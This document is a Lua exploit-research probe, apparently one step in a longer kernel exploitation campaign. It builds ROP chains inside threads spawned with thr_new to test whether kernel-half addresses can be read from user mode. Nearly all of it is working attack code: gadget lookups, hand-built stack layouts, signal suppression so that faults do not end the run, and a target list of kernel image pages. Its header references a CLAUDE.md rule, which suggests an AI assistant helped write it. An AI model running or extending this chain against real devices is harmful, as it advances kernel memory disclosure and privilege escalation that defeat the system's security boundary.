-- CRASH_CLASS: MODERATE
-- PROBE 1456a: is any kernel page READABLE from CPL3?  (the 1331a sweep only tested execution)
--
-- Context:
--   1331a swept 512 kernel-half slots at 4 MB with thr_create children whose RIP was the target, and
--   reported 25 present (page-fault error word (v>>8)&0xF == 5).  That tests EXECUTE permission on the
--   instruction fetch, nothing else: a page that is user-accessible but NX produces exactly the same
--   error word, because bit 2 of the #PF error code means "the access came from CPL3", not "the PTE
--   has U set".  So the readable subset of the kernel half has never been measured.
--
--   The instrument is a thr_new(455) child whose ROP chain does a real data load:
--       pop rax; <target>; mov rax,[rax]; pop rdi; <marker>; mov [rdi],rax; ... thr_exit
--   If the load faults, the child dies alone (a raw thread fault is contained; 1199a-1199c did 512 of
--   them) and marker keeps its sentinel.  If the load succeeds, marker holds the first qword of the
--   target -- a direct kernel read.
--
--   [A] is a control on a user page: it must set the marker, otherwise "unchanged" would be
--   indistinguishable from a broken chain.
--
-- -- prior art:
--   .local/1331a.lua + results/1331a_20261109_094441.txt (presence sweep; EXECUTE only)
--   results/phase17_new_vectors/384b_child_write_minimal.lua (thr_new + pop_rax/syscall-stub chain)
--   probes/phase21_next_vectors/396f_pop_r8_verify.lua (child chains from thr_new)
--   docs/FAULT_CODE_ORACLE_14_10.md (error word semantics)
--   results/phase36_realargs/1452a_fault_teardown_race_20261109_174104.txt (0x7FFFFF000000 is present;
--     a LOADER thread fault kills the process, a raw child fault does not)
--   CLAUDE.md rule 5 (a supervisor page read kills the process from the main thread)

print("=== PROBE 1456a: KERNEL READABILITY (DATA LOAD, CPL3) ===")
print("")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local ok,v = pcall(function() return memory.read_dword(a) end) if ok then return N(v) end return nil end
local function rq(a) local ok,v = pcall(function() return memory.read_qword(a) end) if ok then return v end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val) if type(val)=="table" and val.h then return val.h, val.l end return 0, N(val) end
local function fmt(v) if v==nil then return "nil" end local h,l = get_hi_lo(v) return string.format("0x%08X%08X", h, l) end
local function lo64(v) local h,l = get_hi_lo(v) return h * 4294967296 + l end

local stub = syscall.pipe.fn_addr
local pid0 = N(native.fcall_with_rax(stub, 20))
print(string.format("[0] pid=%d", pid0))

local g_pop_rax = gadgets["pop rax; ret"]
local g_pop_rdi = gadgets["pop rdi; ret"]
local g_load    = gadgets["mov rax, [rax]; ret"]
local g_store   = gadgets["mov [rdi], rax; ret"]
local g_ret     = gadgets["ret"]
print(string.format("[0] gadgets pop_rax=%s pop_rdi=%s load=%s store=%s ret=%s",
    fmt(g_pop_rax), fmt(g_pop_rdi), fmt(g_load), fmt(g_store), fmt(g_ret)))
if not (g_pop_rax and g_pop_rdi and g_load and g_store and g_ret) then
    print("[!] a gadget is missing, stopping")
    print("=== PROBE 1456a COMPLETE ===")
    return
end

-- SIGSEGV / SIGSYS ignored as in 384b, so a stray signal does not end the run
do
    local sa = memory.alloc(0x20)
    wq(N(sa), uint64(1)); wd(N(sa)+8, 0); wq(N(sa)+16, uint64(0))
    pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
end

local SENT = 0xCAFEBABE
local marker_blk = memory.alloc(0x20)
local MARK = N(marker_blk)
local tid_blk = memory.alloc(8)
local par_blk = memory.alloc(0x40)

local function set_marker(v) wq(MARK, uint64(v)) end
local function get_marker() return lo64(rq(MARK)) end

local function spin(n) local x = 0 for i = 1, n do x = x + i end return x end

local function spawn_read(target)
    local stk = memory.alloc(0x8000)
    local sb = N(stk)
    local ss = 0x8000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    wq(rsp +  0, g_pop_rax)
    wq(rsp +  8, uint64(target))
    wq(rsp + 16, g_load)
    wq(rsp + 24, g_pop_rdi)
    wq(rsp + 32, uint64(MARK))
    wq(rsp + 40, g_store)
    wq(rsp + 48, g_pop_rdi)
    wq(rsp + 56, uint64(0))
    wq(rsp + 64, g_pop_rax)
    wq(rsp + 72, uint64(431))
    wq(rsp + 80, stub)

    for i = 0, 0x3C, 4 do wd(N(par_blk) + i, 0) end
    wq(N(par_blk),      g_ret)
    wq(N(par_blk) + 8,  uint64(0))
    wq(N(par_blk) + 0x10, uint64(sb))
    wq(N(par_blk) + 0x18, uint64(ss))
    wq(N(tid_blk), uint64(0))
    wq(N(par_blk) + 0x30, tid_blk)

    local ok, rv = pcall(function() return mk(455)(par_blk, uint64(0x38)) end)
    return ok and N(rv) or -999
end

local function probe_one(tag, target, what)
    set_marker(SENT)
    print(string.format("[%s] target %s (%s)", tag, fmt(target), what))
    local rv = spawn_read(target)
    spin(4000000)
    local raw = rq(MARK)
    local v = get_marker()
    print(string.format("[%s] thr_new=%d marker=%s %s", tag, rv, fmt(raw),
        (v == SENT) and "(sentinel: load faulted, child died)" or "(MARKER CHANGED: the load succeeded)"))
    print("")
    return v
end

-- [A] control: a normal user page must be readable
local ctrl_blk = memory.alloc(0x20)
local CTRL = N(ctrl_blk)
wq(CTRL, uint64(0x41424344))
probe_one("A", CTRL, "user-page control")

-- [B] the present kernel pages from the 1331a sweep, plus 0x7FFFFF000000 from 1452a
local targets = {
    { 0xFFFFFFFFC0000000, "lone stub page, present in every 1331a sweep" },
    { 0xFFFFFFFFC1000000, "image start this boot" },
    { 0xFFFFFFFFC2000000, "image +0x1000000" },
    { 0xFFFFFFFFC3000000, "image +0x2000000" },
    { 0xFFFFFFFFC4000000, "image +0x3000000" },
    { 0xFFFFFFFFC5000000, "image +0x4000000" },
    { 0xFFFFFFFFC6C00000, "last present sample" },
    { 0x7FFFFF000000, "present page seen by the 1452a dump" },
}

for i = 1, #targets do
    probe_one("B" .. i, targets[i][1], targets[i][2])
end

print(string.format("[C] alive pid=%d (was %d)", N(native.fcall_with_rax(stub, 20)), pid0))
print("")
print("=== PROBE 1456a COMPLETE ===")
